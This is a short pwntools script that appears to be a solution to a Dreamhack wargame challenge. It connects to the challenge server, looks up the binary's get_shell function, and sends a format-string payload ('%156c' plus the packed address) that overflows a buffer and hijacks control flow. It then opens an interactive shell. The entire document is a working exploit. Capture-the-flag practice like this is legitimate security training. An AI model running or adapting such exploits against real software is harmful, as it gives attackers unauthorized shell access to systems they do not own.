from pwn import *

p = remote("host1.dreamhack.games", 20589)
e = ELF("./basic_003")

get_shell = e.sym['get_shell']

payload = b"%156c" + p32(get_shell)
p.sendline(payload)
p.interactive()
